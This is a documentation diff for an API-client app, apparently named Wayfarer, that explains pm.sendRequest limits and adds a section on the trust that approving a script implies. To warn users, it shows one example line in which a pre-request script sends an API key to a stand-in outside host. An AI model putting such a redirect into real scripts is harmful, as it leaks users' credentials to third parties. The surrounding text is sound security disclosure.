@@ -105,9 +105,11 @@ replaced. The response has what `pm.response` has.
   no network. The request goes out as your own does: by the same route
   (direct, or the Local Bridge), with no cookies, no cache and no
   `Referer`, under your request timeout, and it ends when you cancel.
-- **A vault secret cannot be sent from a script.** A request that holds a
+- **`pm.sendRequest` does not read the vault.** A request that holds a
   `{{$secret.…}}` reference is refused with `WayfarerUnsupportedError` and
-  nothing is sent. A script is never given a secret's value to send.
+  nothing is sent: the reference must never go out as text (claim C-007).
+  This is not a wall between a script and your secrets; see "What approving
+  a script means" below.
 - A script may make 10 requests in one run; the next is answered with an
   error.
 - The console gets one line per request: `[pm.sendRequest] GET <address> →
@@ -297,6 +299,23 @@ fetched the first time a script runs, from the app's own origin, and kept
 by the service worker after that, so scripts run offline. A library (11 to
 75 kB each) is fetched the first time a script requires it, and kept the
 same way.
+
+## What approving a script means
+
+A script you run is trusted with the request it runs beside. It is never
+handed a vault secret's value in a pre-request script, and `pm.sendRequest`
+never reads the vault. But a pre-request script can change the request you
+are about to send (`pm.request`), and it can set the variables that
+request is built from: the address, a header, the body. The app then
+builds that request as it builds any other, vault secrets included, and
+sends it where it now points. A script that writes
+`pm.request.url = "https://elsewhere.example/?k=" + pm.environment.get("API_KEY")`
+sends your key elsewhere.
+
+This is the reason a script that came from a file, a backup or history
+does not run until you have read it (next section), and the reason to read
+it. Nothing in the app can tell a script that signs a request from one
+that redirects it.
 
 ## Which scripts may run
 
